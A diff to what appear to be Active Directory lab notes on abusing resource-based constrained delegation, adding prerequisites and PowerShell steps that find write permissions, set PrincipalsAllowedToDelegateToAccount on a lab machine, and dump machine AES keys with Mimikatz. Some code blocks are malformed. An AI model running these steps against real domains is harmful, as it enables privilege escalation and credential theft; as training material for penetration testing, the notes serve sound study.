@@ -243,10 +243,33 @@ Rubeus.exe s4u /user:websvc
 - Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service.
 - That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins.
 
-#### Attack Prerequisites 
-To abuse RBCD in the most effective form, we just need two privileges.
+
+
+#### Attack
+__Attack Prerequisites__
+_To abuse RBCD_ in the most effective form, we just need two privileges:
 1. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.
 2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS- MachineAccountQuota is 10 for all domain users)
 
+__Attack__
+- User 'ciadmin' has Write permissions over the dcorp-mgmt machine!
+```powershell
 
+```
+Find-InterestingDomainACL | ?{$_.identityreferencename -
+match 'ciadmin'}
+
+- Using the AD module, configure RBCD on dcorp-mgmt for student machines :
+```powershell
+$comps = 'dcorp-student1$','dcorp-student2$'
+```
+
+```powershell
+Set-ADComputer -Identity dcorp-mgmt 
+-PrincipalsAllowedToDelegateToAccount $comps
+```
+
+- Now, let's get the privileges of dcorp-studentx$ by extracting its AES
+keys:
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 
